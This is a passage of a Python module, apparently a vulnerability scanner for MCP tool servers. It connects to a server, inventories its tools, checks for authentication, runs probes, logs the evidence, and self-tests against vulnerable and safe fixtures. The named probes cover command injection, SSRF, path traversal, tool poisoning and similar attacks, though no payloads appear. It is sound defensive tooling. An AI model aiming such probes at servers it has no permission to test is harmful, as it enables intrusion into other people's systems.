    params = StdioServerParameters(command=argv[0], args=argv[1:], env=child_env, cwd=workdir)
    results: list[ProbeResult] = []
    try:
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as s:
                await s.initialize()
                tools = (await s.list_tools()).tools
                if surface is not None:          # inventory the attack surface in-session (no 2nd connect)
                    surface["tools"] = [{"name": t.name,
                                         "params": sorted((getattr(t, "inputSchema", None) or {}).get("properties", {}))}
                                        for t in tools]
                    try:
                        surface["resources"] = [str(getattr(r, "uri", getattr(r, "name", "")))
                                                for r in (await s.list_resources()).resources]
                    except Exception:  # noqa: BLE001 — many servers expose no resources endpoint
                        surface["resources"] = []
                    # Liveness: does a benign tool call work, or does the server reject it for lack of
                    # credentials? If auth-gated, the execution-dependent probes can't really run, and the
                    # caller must report "requires credentials" instead of a false CLEAN.
                    surface["auth_gated"] = False
                    if tools:
                        try:
                            lr = await s.call_tool(tools[0].name, _build_args(tools[0], {}))
                            surface["auth_gated"] = is_auth_error(_result_text(lr))
                        except Exception as le:  # noqa: BLE001
                            surface["auth_gated"] = is_auth_error(str(le))
                for probe in (probes or ALL_PROBES):
                    results.extend(await probe(s, tools))
    except Exception as exc:   # unwrap anyio/TaskGroup noise into a readable root cause (timeouts/cancel still propagate)
        raise ScanError(_unwrap(exc) or f"{type(exc).__name__}: {exc}"[:200]) from exc
    finally:
        shutil.rmtree(workdir, ignore_errors=True)
    return results


def _write_log(target: str, results: list[ProbeResult]) -> str:
    """Persist a timestamped JSON evidence log of one hunt run; the DB's scans.evidence stores its path."""
    import datetime
    import json
    from dataclasses import asdict

    logs = Path(__file__).resolve().parent / "logs"
    logs.mkdir(exist_ok=True)
    safe = re.sub(r"[^A-Za-z0-9._-]+", "_", target)[:60].strip("_") or "target"
    stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    path = logs / f"{stamp}_{safe}.json"
    path.write_text(json.dumps({"target": target, "scanned_at": stamp,
                                "results": [asdict(r) for r in results]}, indent=2))
    return str(path)


def _print(results: list[ProbeResult]) -> None:
    if not results:
        print("  (no candidate tools matched any probe)")
        return
    for r in results:
        tag = {"VULNERABLE": "\033[31mVULN\033[0m", "CLEAN": "\033[32mok\033[0m"}.get(r.verdict, r.verdict)
        print(f"  [{tag:>12}] {r.probe:<18} {r.tool:<22} {r.rationale}")


def _selftest() -> bool:
    base = Path(__file__).resolve().parent / "probe_fixtures"
    py = sys.executable
    vuln = asyncio.run(scan_target([py, str(base / "vuln_server.py")]))
    safe = asyncio.run(scan_target([py, str(base / "safe_server.py")]))

    def fired(results, probe):
        return any(r.verdict == VULNERABLE for r in results if r.probe == probe)

    print("vuln fixture (every probe must FIRE):")
    _print(vuln)
    print("safe fixture (every probe must stay QUIET):")
    _print(safe)

    ok = True
    for probe in ("ssrf", "command_injection", "path_traversal", "tool_poisoning",
                  "sql_injection", "ssti", "rug_pull", "arg_injection", "deserialization"):
        if not fired(vuln, probe):
            print(f"  FAIL: {probe} did not fire on vuln fixture"); ok = False
        if fired(safe, probe):
            print(f"  FAIL: {probe} false-positived on safe fixture"); ok = False

    # negative: an unprobeable target must raise a READABLE ScanError, never the opaque TaskGroup wrapper
    try:
        asyncio.run(scan_target([py, str(base / "no_such_server_xyz.py")]))
        print("  FAIL: scan of missing target did not raise"); ok = False
    except ScanError as e:
        if "TaskGroup" in str(e) or not str(e).strip():
            print(f"  FAIL: ScanError still opaque: {e!s}"); ok = False
        else:
            print(f"  ok: unprobeable target -> ScanError({str(e)[:60]})")
    except Exception as e:  # noqa: BLE001
        print(f"  FAIL: raised {type(e).__name__}, not ScanError: {str(e)[:80]}"); ok = False

    print("probes self-check:", "ok" if ok else "FAILED")
    return ok


def main(argv=None) -> int:
    p = argparse.ArgumentParser(prog="hunt.probes", description="impl-bug probes for MCP servers")
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument("--selftest", action="store_true", help="prove probes fire/stay quiet on fixtures")
    g.add_argument("--target-stdio", metavar="CMD", help='local server to probe, e.g. "npx some-mcp"')
    args = p.parse_args(argv)
    if args.selftest:
        return 0 if _selftest() else 1
    import shlex
    results = asyncio.run(scan_target(shlex.split(args.target_stdio)))
    print(f"impl-bug probes vs {args.target_stdio!r}:")
    _print(results)
    print("log:", _write_log(args.target_stdio, results))
    return 1 if any(r.verdict == VULNERABLE for r in results) else 0


if __name__ == "__main__":
    sys.exit(main())
